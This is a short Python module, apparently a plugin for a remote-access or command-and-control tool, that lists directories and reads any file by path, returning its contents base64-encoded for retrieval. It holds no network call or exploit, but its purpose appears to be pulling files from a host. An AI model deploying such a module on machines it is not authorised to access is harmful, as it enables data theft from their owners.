import os
import base64

def run(**args):
    print('[*] File Manager Core Execution Active.')
    action = args.get('action', 'list')
    target_path = args.get('path', '.')
    if action == 'list':
        try:
            if os.path.exists(target_path):
                return f'[+] Inventory for {target_path}:\n{str(os.listdir(target_path))}'
            else:
                return f'[-] Error: Path {target_path} nahi mila.'
        except Exception as e:
            return f'[-] Permission Error: {str(e)}'
    elif action == 'download':
        try:
            if os.path.exists(target_path) and os.path.isfile(target_path):
                with open(target_path, 'rb') as f:
                    return f'[ SUCCESS_FILE ] Name: {os.path.basename(target_path)} | Data: {base64.b64encode(f.read()).decode("utf-8")}'
            else:
                return f'[-] Error: File maujood nahi hai.'
        except Exception as e:
            return f'[-] Error: {str(e)}'
    return '[-] Invalid action.'
